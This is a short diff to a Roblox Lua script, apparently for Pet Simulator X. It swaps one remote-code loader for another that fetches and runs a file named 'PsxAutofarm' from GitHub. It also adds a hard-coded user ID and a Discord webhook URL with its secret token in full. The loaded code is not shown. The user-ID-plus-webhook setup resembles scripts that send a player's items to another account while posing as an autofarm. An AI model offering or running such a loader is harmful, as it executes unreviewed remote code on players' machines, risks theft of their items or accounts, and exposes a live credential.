@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FerskensExploiting/test/main/test"))()
+_G.UserID = 3750468879
+_G.WebHook = "https://discordapp.com/api/webhooks/1081562694349492294/kQsbzUDZl3WTp1WlDljjKLKyUbbAIIlugQXgX7iQIq_krk7LkjQ9A0ISVpduZPt4vCUH"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
